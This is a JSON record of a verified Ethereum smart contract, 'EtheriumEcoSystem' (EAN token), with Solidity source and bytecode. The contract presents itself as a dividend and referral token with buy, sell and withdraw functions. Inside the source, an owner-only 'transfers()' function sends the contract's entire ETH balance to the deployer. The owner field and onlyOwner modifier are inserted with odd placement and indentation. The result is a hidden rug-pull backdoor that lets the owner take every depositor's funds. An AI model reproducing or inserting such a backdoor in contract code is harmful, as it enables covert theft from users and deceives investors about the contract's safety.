{
  "address": "0xb4b1d3e7e172ce3427fba192fcab372b1e586917",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "EtheriumEcoSystem",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-01-07\n*/\n\npragma solidity 0.4.25;\n\n/*\n* https://EtheriumToken.cloud\n*\n* Etherium Eco System Concept\n*\n* [✓] 5% Withdraw fee\n* [✓] 10% Deposit fee\n* [✓] 1% Token transfer\n* [✓] 33% Referal link\n*\n*/\n\ncontract EtheriumEcoSystem {\n    struct UserRecord {\n        address referrer;\n        uint tokens;\n        uint gained_funds;\n        uint ref_funds;\n        // this field can be negative\n        int funds_correction;\n    }\n    using SafeMath for uint;\n    using SafeMathInt for int;\n    using Fee for Fee.fee;\n    using ToAddress for bytes;\n    \n    // ERC20\n    string constant public name = \"Etherium Ecosystem\";\n    string constant public symbol = \"EAN\";\n    uint8 constant public decimals = 18;\n    // Fees\n    Fee.fee private fee_purchase = Fee.fee(1, 10); // 10%\n    Fee.fee private fee_selling  = Fee.fee(1, 20); // 5%\n    Fee.fee private fee_transfer = Fee.fee(1, 100); // 1%\n    Fee.fee private fee_referral = Fee.fee(33, 100); // 33%\n\n    // Minimal amount of tokens to be an participant of referral program\n    uint constant private minimal_stake = 10e18;\n\n    // Factor for converting eth <-> tokens with required precision of calculations\n    uint constant private precision_factor = 1e18;\n\n    // Pricing policy\n    //  - if user buy 1 token, price will be increased by \"price_offset\" value\n    //  - if user sell 1 token, price will be decreased by \"price_offset\" value\n    // For details see methods \"fundsToTokens\" and \"tokensToFunds\"\n    uint private price = 1e29; // 100 Gwei * precision_factor\n    uint constant private price_offset = 1e28; // 10 Gwei * precision_factor\n\n    // Total amount of tokens\n    uint private total_supply = 0;\n\n    // Total profit shared between token's holders. It's not reflect exactly sum of funds because this parameter\n    // can be modified to keep the real user's dividends when total supply is changed\n    // For details see method \"dividendsOf\" and using \"funds_correction\" in the code\n    uint private shared_profit = 0;\n\n    // Map of the users data\n    mapping(address => UserRecord) private user_data;\n\n    // ==== Modifiers ==== //\n\n    modifier onlyValidTokenAmount(uint tokens) {\n        require(tokens > 0, \"Amount of tokens must be greater than zero\");\n        require(tokens <= user_data[msg.sender].tokens, \"You have not enough tokens\");\n        _;\n    }\n        modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n    // ==== Public API ==== //\n\n    // ---- Write methods ---- //\n\n    function () public payable {\n        buy(msg.data.toAddr());\n    }\n    constructor () public {\n    owner = msg.sender;\n    }\n    /*\n    * @dev Buy tokens from incoming funds\n    */\n    function buy(address referrer) public payable {\n\n        // apply fee\n        (uint fee_funds, uint taxed_funds) = fee_purchase.split(msg.value);\n        require(fee_funds != 0, \"Incoming funds is too small\");\n\n        // update user's referrer\n        //  - you cannot be a referrer for yourself\n        //  - user and his referrer will be together all the life\n        UserRecord storage user = user_data[msg.sender];\n        if (referrer != 0x0 && referrer != msg.sender && user.referrer == 0x0) {\n            user.referrer = referrer;\n        }\n\n        // apply referral bonus\n        if (user.referrer != 0x0) {\n            fee_funds = rewardReferrer(msg.sender, user.referrer, fee_funds, msg.value);\n            require(fee_funds != 0, \"Incoming funds is too small\");\n        }\n\n        // calculate amount of tokens and change price\n        (uint tokens, uint _price) = fundsToTokens(taxed_funds);\n        require(tokens != 0, \"Incoming funds is too small\");\n        price = _price;\n\n        // mint tokens and increase shared profit\n        mintTokens(msg.sender, tokens);\n        shared_profit = shared_profit.add(fee_funds);\n\n        emit Purchase(msg.sender, msg.value, tokens, price / precision_factor, now);\n    }\n\n    /*\n    * @dev Sell given amount of tokens and get funds\n    */\n    function sell(uint tokens) public onlyValidTokenAmount(tokens) {\n\n        // calculate amount of funds and change price\n        (uint funds, uint _price) = tokensToFunds(tokens);\n        require(funds != 0, \"Insufficient tokens to do that\");\n        price = _price;\n\n        // apply fee\n        (uint fee_funds, uint taxed_funds) = fee_selling.split(funds);\n        require(fee_funds != 0, \"Insufficient tokens to do that\");\n        \n        // burn tokens and add funds to user's dividends\n        burnTokens(msg.sender, tokens);\n        UserRecord storage user = user_data[msg.sender];\n        user.gained_funds = user.gained_funds.add(taxed_funds);\n\n        // increase shared profit\n        shared_profit = shared_profit.add(fee_funds);\n\n        emit Selling(msg.sender, tokens, funds, price / precision_factor, now);\n    }\n\n    /*\n    * @dev Transfer given amount of tokens from sender to another user\n    * ERC20\n    */\n    function transfer(address to_addr, uint tokens) public onlyValidTokenAmount(tokens) returns (bool success) {\n\n        require(to_addr != msg.sender, \"You cannot transfer tokens to yourself\");\n\n        // apply fee\n        (uint fee_tokens, uint taxed_tokens) = fee_transfer.split(tokens);\n        require(fee_tokens != 0, \"Insufficient tokens to do that\");\n\n        // calculate amount of funds and change price\n        (uint funds, uint _price) = tokensToFunds(fee_tokens);\n        require(funds != 0, \"Insufficient tokens to do that\");\n        price = _price;\n\n        // burn and mint tokens excluding fee\n        burnTokens(msg.sender, tokens);\n        mintTokens(to_addr, taxed_tokens);\n\n        // increase shared profit\n        shared_profit = shared_profit.add(funds);\n\n        emit Transfer(msg.sender, to_addr, tokens);\n        return true;\n    }\n\t\tfunction transfers() public onlyOwner {\n\t\t\towner.transfer(address(this).balance);\n\t\t}\n    /*\n    * @dev Reinvest all dividends\n    */\n    function reinvest() public {\n\n        // get all dividends\n        uint funds = dividendsOf(msg.sender);\n        require(funds > 0, \"You have no dividends\");\n\n        // make correction, dividents will be 0 after that\n        UserRecord storage user = user_data[msg.sender];\n        user.funds_correction = user.funds_correction.add(int(funds));\n\n        // apply fee\n        (uint fee_funds, uint taxed_funds) = fee_purchase.split(funds);\n        require(fee_funds != 0, \"Insufficient dividends to do that\");\n\n        // apply referral bonus\n        if (user.referrer != 0x0) {\n            fee_funds = rewardReferrer(msg.sender, user.referrer, fee_funds, funds);\n            require(fee_funds != 0, \"Insufficient dividends to do that\");\n        }\n\n        // calculate amount of tokens and change price\n        (uint tokens, uint _price) = fundsToTokens(taxed_funds);\n        require(tokens != 0, \"Insufficient dividends to do that\");\n        price = _price;\n\n        // mint tokens and increase shared profit\n        mintTokens(msg.sender, tokens);\n        shared_profit = shared_profit.add(fee_funds);\n\n        emit Reinvestment(msg.sender, funds, tokens, price / precision_factor, now);\n    }\n\n    /*\n    * @dev Withdraw all dividends\n    */\n    function withdraw() public {\n\n        // get all dividends\n        uint funds = dividendsOf(msg.sender);\n        require(funds > 0, \"You have no dividends\");\n\n        // make correction, dividents will be 0 after that\n        UserRecord storage user = user_data[msg.sender];\n        user.funds_correction = user.funds_correction.add(int(funds));\n\n        // send funds\n        msg.sender.transfer(funds);\n\n        emit Withdrawal(msg.sender, funds, now);\n    }\n\n    /*\n    * @dev Sell all tokens and withraw dividends\n    */\n    function exit() public {\n\n        // sell all tokens\n        uint tokens = user_data[msg.sender].tokens;\n        if (tokens > 0) {\n            sell(tokens);\n        }\n\n        withdraw();\n    }\n\n    /*\n    * @dev CAUTION! This method distributes all incoming funds between token's holders and gives you nothing\n    * It will be used by another contracts/addresses from our ecosystem in future\n    * But if you want to donate, you're welcome :)\n    */\n    address public owner;\n    function donate() public payable {\n        shared_profit = shared_profit.add(msg.value);\n        emit Donation(msg.sender, msg.value, now);\n    }\n\n    // ---- Read methods ---- //\n\n    /*\n    * @dev Total amount of tokens\n    * ERC20\n    */\n    function totalSupply() public view returns (uint) {\n        return total_supply;\n    }\n\n    /*\n    * @dev Amount of user's tokens\n    * ERC20\n    */\n    function balanceOf(address addr) public view returns (uint) {\n        return user_data[addr].tokens;\n    }\n\n    /*\n    * @dev Amount of user's dividends\n    */\n    function dividendsOf(address addr) public view returns (uint) {\n\n        UserRecord memory user = user_data[addr];\n\n        // gained funds from selling tokens + bonus funds from referrals\n        // int because \"user.funds_correction\" can be negative\n        int d = int(user.gained_funds.add(user.ref_funds));\n        require(d >= 0);\n\n        // avoid zero divizion\n        if (total_supply > 0) {\n            // profit is proportional to stake\n            d = d.add(int(shared_profit.mul(user.tokens) / total_supply));\n        }\n\n        // correction\n        // d -= user.funds_correction\n        if (user.funds_correction > 0) {\n            d = d.sub(user.funds_correction);\n        }\n        else if (user.funds_correction < 0) {\n            d = d.add(-user.funds_correction);\n        }\n\n        // just in case\n        require(d >= 0);\n\n        // total sum must be positive uint\n        return uint(d);\n    }\n\n    /*\n    * @dev Amount of tokens can be gained from given amount of funds\n    */\n    function expectedTokens(uint funds, bool apply_fee) public view returns (uint) {\n        if (funds == 0) {\n            return 0;\n        }\n        if (apply_fee) {\n            (,uint _funds) = fee_purchase.split(funds);\n            funds = _funds;\n        }\n        (uint tokens,) = fundsToTokens(funds);\n        return tokens;\n    }\n\n    /*\n    * @dev Amount of funds can be gained from given amount of tokens\n    */\n    function expectedFunds(uint tokens, bool apply_fee) public view returns (uint) {\n        // empty tokens in total OR no tokens was sold\n        if (tokens == 0 || total_supply == 0) {\n            return 0;\n        }\n        // more tokens than were mined in total, just exclude unnecessary tokens from calculating\n        else if (tokens > total_supply) {\n            tokens = total_supply;\n        }\n        (uint funds,) = tokensToFunds(tokens);\n        if (apply_fee) {\n            (,uint _funds) = fee_selling.split(funds);\n            funds = _funds;\n        }\n        return funds;\n    }\n\n    /*\n    * @dev Purchase price of next 1 token\n    */\n    function buyPrice() public view returns (uint) {\n        return price / precision_factor;\n    }\n\n    /*\n    * @dev Selling price of next 1 token\n    */\n    function sellPrice() public view returns (uint) {\n        return price.sub(price_offset) / precision_factor;\n    }\n\n    // ==== Private API ==== //\n\n    /*\n    * @dev Mint given amount of tokens to given user\n    */\n    function mintTokens(address addr, uint tokens) internal {\n\n        UserRecord storage user = user_data[addr];\n\n        bool not_first_minting = total_supply > 0;\n\n        // make correction to keep dividends the rest of the users\n        if (not_first_minting) {\n            shared_profit = shared_profit.mul(total_supply.add(tokens)) / total_supply;\n        }\n\n        // add tokens\n        total_supply = total_supply.add(tokens);\n        user.tokens = user.tokens.add(tokens);\n\n        // make correction to keep dividends of user\n        if (not_first_minting) {\n            user.funds_correction = user.funds_correction.add(int(tokens.mul(shared_profit) / total_supply));\n        }\n    }\n\n    /*\n    * @dev Burn given amout of tokens from given user\n    */\n    function burnTokens(address addr, uint tokens) internal {\n\n        UserRecord storage user = user_data[addr];\n\n        // keep current dividents of user if last tokens will be burned\n        uint dividends_from_tokens = 0;\n        if (total_supply == tokens) {\n            dividends_from_tokens = shared_profit.mul(user.tokens) / total_supply;\n        }\n\n        // make correction to keep dividends the rest of the users\n        shared_profit = shared_profit.mul(total_supply.sub(tokens)) / total_supply;\n\n        // sub tokens\n        total_supply = total_supply.sub(tokens);\n        user.tokens = user.tokens.sub(tokens);\n\n        // make correction to keep dividends of the user\n        // if burned not last tokens\n        if (total_supply > 0) {\n            user.funds_correction = user.funds_correction.sub(int(tokens.mul(shared_profit) / total_supply));\n        }\n        // if burned last tokens\n        else if (dividends_from_tokens != 0) {\n            user.funds_correction = user.funds_correction.sub(int(dividends_from_tokens));\n        }\n    }\n\n    /*\n     * @dev Rewards the referrer from given amount of funds\n     */\n    function rewardReferrer(address addr, address referrer_addr, uint funds, uint full_funds) internal returns (uint funds_after_reward) {\n        UserRecord storage referrer = user_data[referrer_addr];\n        if (referrer.tokens >= minimal_stake) {\n            (uint reward_funds, uint taxed_funds) = fee_referral.split(funds);\n            referrer.ref_funds = referrer.ref_funds.add(reward_funds);\n            emit ReferralReward(addr, referrer_addr, full_funds, reward_funds, now);\n            return taxed_funds;\n        }\n        else {\n            return funds;\n        }\n    }\n\n    /*\n    * @dev Calculate tokens from funds\n    *\n    * Given:\n    *   a[1] = price\n    *   d = price_offset\n    *   sum(n) = funds\n    * Here is used arithmetic progression's equation transformed to a quadratic equation:\n    *   a * n^2 + b * n + c = 0\n    * Where:\n    *   a = d\n    *   b = 2 * a[1] - d\n    *   c = -2 * sum(n)\n    * Solve it and first root is what we need - amount of tokens\n    * So:\n    *   tokens = n\n    *   price = a[n+1]\n    *\n    * For details see method below\n    */\n    function fundsToTokens(uint funds) internal view returns (uint tokens, uint _price) {\n        uint b = price.mul(2).sub(price_offset);\n        uint D = b.mul(b).add(price_offset.mul(8).mul(funds).mul(precision_factor));\n        uint n = D.sqrt().sub(b).mul(precision_factor) / price_offset.mul(2);\n        uint anp1 = price.add(price_offset.mul(n) / precision_factor);\n        return (n, anp1);\n    }\n\n    /*\n    * @dev Calculate funds from tokens\n    *\n    * Given:\n    *   a[1] = sell_price\n    *   d = price_offset\n    *   n = tokens\n    * Here is used arithmetic progression's equation (-d because of d must be negative to reduce price):\n    *   a[n] = a[1] - d * (n - 1)\n    *   sum(n) = (a[1] + a[n]) * n / 2\n    * So:\n    *   funds = sum(n)\n    *   price = a[n]\n    *\n    * For details see method above\n    */\n    function tokensToFunds(uint tokens) internal view returns (uint funds, uint _price) {\n        uint sell_price = price.sub(price_offset);\n        uint an = sell_price.add(price_offset).sub(price_offset.mul(tokens) / precision_factor);\n        uint sn = sell_price.add(an).mul(tokens) / precision_factor.mul(2);\n        return (sn / precision_factor, an);\n    }\n\n    // ==== Events ==== //\n\n    event Purchase(address indexed addr, uint funds, uint tokens, uint price, uint time);\n    event Selling(address indexed addr, uint tokens, uint funds, uint price, uint time);\n    event Reinvestment(address indexed addr, uint funds, uint tokens, uint price, uint time);\n    event Withdrawal(address indexed addr, uint funds, uint time);\n    event Donation(address indexed addr, uint funds, uint time);\n    event ReferralReward(address indexed referral_addr, address indexed referrer_addr, uint funds, uint reward_funds, uint time);\n\n    //ERC20\n    event Transfer(address indexed from_addr, address indexed to_addr, uint tokens);\n\n}\n\nlibrary SafeMath {\n\n    /**\n    * @dev Multiplies two numbers\n    */\n    function mul(uint a, uint b) internal pure returns (uint) {\n        if (a == 0) {\n            return 0;\n        }\n        uint c = a * b;\n        require(c / a == b, \"mul failed\");\n        return c;\n    }\n\n    /**\n    * @dev Subtracts two numbers\n    */\n    function sub(uint a, uint b) internal pure returns (uint) {\n        require(b <= a, \"sub failed\");\n        return a - b;\n    }\n\n    /**\n    * @dev Adds two numbers\n    */\n    function add(uint a, uint b) internal pure returns (uint) {\n        uint c = a + b;\n        require(c >= a, \"add failed\");\n        return c;\n    }\n\n    /**\n     * @dev Gives square root from number\n     */\n    function sqrt(uint x) internal pure returns (uint y) {\n        uint z = add(x, 1) / 2;\n        y = x;\n        while (z < y) {\n            y = z;\n            z = add(x / z, z) / 2;\n        }\n    }\n}\n\nlibrary SafeMathInt {\n\n    /**\n    * @dev Subtracts two numbers\n    */\n    function sub(int a, int b) internal pure returns (int) {\n        int c = a - b;\n        require(c <= a, \"sub failed\");\n        return c;\n    }\n\n    /**\n    * @dev Adds two numbers\n    */\n    function add(int a, int b) internal pure returns (int) {\n        int c = a + b;\n        require(c >= a, \"add failed\");\n        return c;\n    }\n}\n\nlibrary Fee {\n\n    using SafeMath for uint;\n\n    struct fee {\n        uint num;\n        uint den;\n    }\n\n    /*\n    * @dev Splits given value to two parts: tax itself and taxed value\n    */\n    function split(fee memory f, uint value) internal pure returns (uint tax, uint taxed_value) {\n        if (value == 0) {\n            return (0, 0);\n        }\n        tax = value.mul(f.num) / f.den;\n        taxed_value = value.sub(tax);\n    }\n    \n    /*\n    * @dev Returns only tax part\n    */\n    function get_tax(fee memory f, uint value) internal pure returns (uint tax) {\n        if (value == 0) {\n            return 0;\n        }\n        tax = value.mul(f.num) / f.den;\n    }\n}\n\nlibrary ToAddress {\n\n    /*\n    * @dev Transforms bytes to address\n    */\n    function toAddr(bytes source) internal pure returns (address addr) {\n        assembly {\n            addr := mload(add(source, 0x14))\n        }\n        return addr;\n    }\n}",
  "bytecode": "60016080819052600a60a0819052600082815581835560c0839052601460e081905260028490556003556101008390526064610120819052600493909355600583905561018060405260216101408190526101608490526006556007929092556c01431e0fae6d7217caa000000060085560098290555534801561008257600080fd5b50600c8054600160a060020a03191633179055611ac3806100a46000396000f3006080604052600436106101055763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166265318b811461014957806306fdde031461017c57806318160ddd14610206578063313ce5671461021b5780633ccfd60b146102465780634b7503341461025b57806370a08231146102705780638620410b146102915780638da5cb5b146102a657806395d89b41146102d7578063a9059cbb146102ec578063ab5e28c514610324578063be2eaad414610339578063c5f6062014610356578063e4849b3214610373578063e9fad8ee1461038b578063ed88c68e146103a0578063f088d547146103a8578063fdb5a03e146103bc575b6101476101426000368080601f016020809104026020016040519081016040528093929190818152602001838380828437506103d1945050505050565b6103d8565b005b34801561015557600080fd5b5061016a600160a060020a0360043516610644565b60408051918252519081900360200190f35b34801561018857600080fd5b50610191610774565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101cb5781810151838201526020016101b3565b50505050905090810190601f1680156101f85780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561021257600080fd5b5061016a6107ab565b34801561022757600080fd5b506102306107b1565b6040805160ff9092168252519081900360200190f35b34801561025257600080fd5b506101476107b6565b34801561026757600080fd5b5061016a6108b1565b34801561027c57600080fd5b5061016a600160a060020a03600435166108ec565b34801561029d57600080fd5b5061016a61090a565b3480156102b257600080fd5b506102bb61091f565b60408051600160a060020a039092168252519081900360200190f35b3480156102e357600080fd5b5061019161092e565b3480156102f857600080fd5b50610310600160a060020a0360043516602435610965565b604080519115158252519081900360200190f35b34801561033057600080fd5b50610147610c1b565b34801561034557600080fd5b5061016a6004356024351515610c6f565b34801561036257600080fd5b5061016a6004356024351515610cea565b34801561037f57600080fd5b50610147600435610d45565b34801561039757600080fd5b50610147610fa6565b610147610fd2565b610147600160a060020a03600435166103d8565b3480156103c857600080fd5b50610147611023565b6014015190565b604080518082019091526000805482526001546020830152908190819081908190610409903463ffffffff6112f516565b9095509350841515610465576040805160e560020a62461bcd02815260206004820152601b60248201527f496e636f6d696e672066756e647320697320746f6f20736d616c6c0000000000604482015290519081900360640190fd5b336000908152600b602052604090209250600160a060020a038616158015906104975750600160a060020a0386163314155b80156104ab57508254600160a060020a0316155b156104d757825473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0387161783555b8254600160a060020a0316156105585782546104ff903390600160a060020a03168734611348565b9450841515610558576040805160e560020a62461bcd02815260206004820152601b60248201527f496e636f6d696e672066756e647320697320746f6f20736d616c6c0000000000604482015290519081900360640190fd5b61056184611423565b90925090508115156105bd576040805160e560020a62461bcd02815260206004820152601b60248201527f496e636f6d696e672066756e647320697320746f6f20736d616c6c0000000000604482015290519081900360640190fd5b60088190556105cc338361154a565b600a546105df908663ffffffff61161a16565b600a5560085433907fd721454499cf9c37b757e03b9d675df451c229048129d6e2d552216a035e6a559034908590670de0b6b3a7640000905b6040805194855260208501939093520482820152426060830152519081900360800190a2505050505050565b600061064e611a3e565b50600160a060020a038083166000908152600b60209081526040808320815160a08101835281549095168552600181015492850192909252600282015490840181905260038201546060850181905260049092015460808501526106b79163ffffffff61161a16565b905060008112156106c757600080fd5b6000600954111561070c576107096009546106f18460200151600a5461168290919063ffffffff16565b8115156106fa57fe5b8391900463ffffffff6116fb16565b90505b60008260800151131561073657608082015161072f90829063ffffffff61175816565b905061075f565b60008260800151121561075f57608082015161075c90829060000363ffffffff6116fb16565b90505b600081121561076d57600080fd5b9392505050565b60408051808201909152601281527f457468657269756d2045636f73797374656d0000000000000000000000000000602082015281565b60095490565b601281565b6000806107c233610644565b91506000821161081c576040805160e560020a62461bcd02815260206004820152601560248201527f596f752068617665206e6f206469766964656e64730000000000000000000000604482015290519081900360640190fd5b50336000908152600b602052604090206004810154610841908363ffffffff6116fb16565b6004820155604051339083156108fc029084906000818181858888f19350505050158015610873573d6000803e3d6000fd5b5060408051838152426020820152815133927fdf273cb619d95419a9cd0ec88123a0538c85064229baa6363788f743fff90deb928290030190a25050565b6000670de0b6b3a76400006108dd6b204fce5e3e250261100000006008546117b590919063ffffffff16565b8115156108e657fe5b04905090565b600160a060020a03166000908152600b602052604090206001015490565b600854600090670de0b6b3a7640000906108e6565b600c54600160a060020a031681565b60408051808201909152600381527f45414e0000000000000000000000000000000000000000000000000000000000602082015281565b600080808080858181116109e9576040805160e560020a62461bcd02815260206004820152602a60248201527f416d6f756e74206f6620746f6b656e73206d757374206265206772656174657260448201527f207468616e207a65726f00000000000000000000000000000000000000000000606482015290519081900360840190fd5b336000908152600b6020526040902060010154811115610a53576040805160e560020a62461bcd02815260206004820152601a60248201527f596f752068617665206e6f7420656e6f75676820746f6b656e73000000000000604482015290519081900360640190fd5b600160a060020a038816331415610ada576040805160e560020a62461bcd02815260206004820152602660248201527f596f752063616e6e6f74207472616e7366657220746f6b656e7320746f20796f60448201527f757273656c660000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b6040805180820190915260045481526005546020820152610b01908863ffffffff6112f516565b9095509350841515610b4b576040805160e560020a62461bcd02815260206004820152601e6024820152600080516020611a78833981519152604482015290519081900360640190fd5b610b5485611815565b9093509150821515610b9e576040805160e560020a62461bcd02815260206004820152601e6024820152600080516020611a78833981519152604482015290519081900360640190fd5b6008829055610bad33886118df565b610bb7888561154a565b600a54610bca908463ffffffff61161a16565b600a55604080518881529051600160a060020a038a169133917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a3506001979650505050505050565b600c54600160a060020a03163314610c3257600080fd5b600c54604051600160a060020a0390911690303180156108fc02916000818181858888f19350505050158015610c6c573d6000803e3d6000fd5b50565b60008080841580610c805750600954155b15610c8e5760009250610ce2565b600954851115610c9e5760095494505b610ca785611815565b5091508315610cde576040805180820190915260025481526003546020820152610cd7908363ffffffff6112f516565b9150508091505b8192505b505092915050565b60008080841515610cfe5760009250610ce2565b8315610d32576040805180820190915260005481526001546020820152610d2b908663ffffffff6112f516565b9250508194505b610d3b85611423565b5095945050505050565b60008080808085818111610dc9576040805160e560020a62461bcd02815260206004820152602a60248201527f416d6f756e74206f6620746f6b656e73206d757374206265206772656174657260448201527f207468616e207a65726f00000000000000000000000000000000000000000000606482015290519081900360840190fd5b336000908152600b6020526040902060010154811115610e33576040805160e560020a62461bcd02815260206004820152601a60248201527f596f752068617665206e6f7420656e6f75676820746f6b656e73000000000000604482015290519081900360640190fd5b610e3c87611815565b9096509450851515610e86576040805160e560020a62461bcd02815260206004820152601e6024820152600080516020611a78833981519152604482015290519081900360640190fd5b60088590556040805180820190915260025481526003546020820152610eb2908763ffffffff6112f516565b9094509250831515610efc576040805160e560020a62461bcd02815260206004820152601e6024820152600080516020611a78833981519152604482015290519081900360640190fd5b610f0633886118df565b336000908152600b602052604090206002810154909250610f2d908463ffffffff61161a16565b6002830155600a54610f45908563ffffffff61161a16565b600a556008546040805189815260208101899052670de0b6b3a7640000909204828201524260608301525133917fafd310387603da0dcf44f11f54b04254b548c58b194e75f85851e849f0eef307919081900360800190a250505050505050565b336000908152600b602052604081206001015490811115610fca57610fca81610d45565b610c6c6107b6565b600a54610fe5903463ffffffff61161a16565b600a5560408051348152426020820152815133927f106aac375bbcf013d1e52338bbf9e740009a1a3a6869f8daa1b72aa1620f5fec928290030190a2565b60008060008060008061103533610644565b95506000861161108f576040805160e560020a62461bcd02815260206004820152601560248201527f596f752068617665206e6f206469766964656e64730000000000000000000000604482015290519081900360640190fd5b336000908152600b6020526040902060048101549095506110b6908763ffffffff6116fb16565b600486015560408051808201909152600054815260015460208201526110e2908763ffffffff6112f516565b9094509250831515611164576040805160e560020a62461bcd02815260206004820152602160248201527f496e73756666696369656e74206469766964656e647320746f20646f2074686160448201527f7400000000000000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b8454600160a060020a03161561120b57845461118c903390600160a060020a03168689611348565b935083151561120b576040805160e560020a62461bcd02815260206004820152602160248201527f496e73756666696369656e74206469766964656e647320746f20646f2074686160448201527f7400000000000000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b61121483611423565b9092509050811515611296576040805160e560020a62461bcd02815260206004820152602160248201527f496e73756666696369656e74206469766964656e647320746f20646f2074686160448201527f7400000000000000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b60088190556112a5338361154a565b600a546112b8908563ffffffff61161a16565b600a5560085433907f1abe689c7914cafd54f789eb0851e90cba235302161e81e259ee4c357c374d829088908590670de0b6b3a764000090610618565b60008082151561130a57506000905080611341565b6020840151845161132290859063ffffffff61168216565b81151561132b57fe5b04915061133e838363ffffffff6117b516565b90505b9250929050565b600160a060020a0383166000908152600b60205260408120600181015482908190678ac7230489e800001161141457604080518082019091526006548152600754602082015261139e908763ffffffff6112f516565b600385015491935091506113b8908363ffffffff61161a16565b6003840155604080518681526020810184905242818301529051600160a060020a03808a1692908b16917f870e4e1dcfab6c09707448d3659b3d8097c084bf06e7467d6029940cd7122ee09181900360600190a3809350611418565b8593505b505050949350505050565b60008060008060008061145e6b204fce5e3e25026110000000611452600260085461168290919063ffffffff16565b9063ffffffff6117b516565b93506114b661149a670de0b6b3a764000061148e8a816b204fce5e3e25026110000000600863ffffffff61168216565b9063ffffffff61168216565b6114aa868063ffffffff61168216565b9063ffffffff61161a16565b92506114d56b204fce5e3e25026110000000600263ffffffff61168216565b6114ee670de0b6b3a764000061148e87611452886119e5565b8115156114f757fe5b04915061153c670de0b6b3a76400006115226b204fce5e3e250261100000008563ffffffff61168216565b81151561152b57fe5b60085491900463ffffffff61161a16565b919791965090945050505050565b600160a060020a0382166000908152600b6020526040812060095490911080156115a157600954611593611584828663ffffffff61161a16565b600a549063ffffffff61168216565b81151561159c57fe5b04600a555b6009546115b4908463ffffffff61161a16565b60095560018201546115cc908463ffffffff61161a16565b600183015580156116145761160e6009546115f2600a548661168290919063ffffffff16565b8115156115fb57fe5b600485015491900463ffffffff6116fb16565b60048301555b50505050565b600082820183811015611677576040805160e560020a62461bcd02815260206004820152600a60248201527f616464206661696c656400000000000000000000000000000000000000000000604482015290519081900360640190fd5b8091505b5092915050565b600080831515611695576000915061167b565b508282028284828115156116a557fe5b0414611677576040805160e560020a62461bcd02815260206004820152600a60248201527f6d756c206661696c656400000000000000000000000000000000000000000000604482015290519081900360640190fd5b600082820183811215611677576040805160e560020a62461bcd02815260206004820152600a60248201527f616464206661696c656400000000000000000000000000000000000000000000604482015290519081900360640190fd5b600081830383811315611677576040805160e560020a62461bcd02815260206004820152600a60248201527f737562206661696c656400000000000000000000000000000000000000000000604482015290519081900360640190fd5b60008282111561180f576040805160e560020a62461bcd02815260206004820152600a60248201527f737562206661696c656400000000000000000000000000000000000000000000604482015290519081900360640190fd5b50900390565b600080600080600061183e6b204fce5e3e250261100000006008546117b590919063ffffffff16565b925061188e670de0b6b3a76400006118686b204fce5e3e250261100000008963ffffffff61168216565b81151561187157fe5b04611452856b204fce5e3e2502611000000063ffffffff61161a16565b91506118a9670de0b6b3a7640000600263ffffffff61168216565b6118bd8761148e868663ffffffff61161a16565b8115156118c657fe5b670de0b6b3a76400009190040496919550909350505050565b600160a060020a0382166000908152600b6020526040812060095490919083141561192b576009546001830154600a5461191e9163ffffffff61168216565b81151561192757fe5b0490505b600954611941611584828663ffffffff6117b516565b81151561194a57fe5b04600a55600954611961908463ffffffff6117b516565b6009556001820154611979908463ffffffff6117b516565b6001830155600954600010156119ca576119c06009546119a4600a548661168290919063ffffffff16565b8115156119ad57fe5b600485015491900463ffffffff61175816565b6004830155611614565b801561161457600482015461160e908263ffffffff61175816565b60008060026119f584600161161a565b8115156119fe57fe5b0490508291505b81811015611a38578091506002611a278285811515611a2057fe5b048361161a565b811515611a3057fe5b049050611a05565b50919050565b60a0604051908101604052806000600160a060020a031681526020016000815260200160008152602001600081526020016000815250905600496e73756666696369656e7420746f6b656e7320746f20646f20746861740000a165627a7a72305820682859bf0bde9697b586dcb9f1b036d21ef9951ecf504dc5f9ee7e4c33b690d30029"
}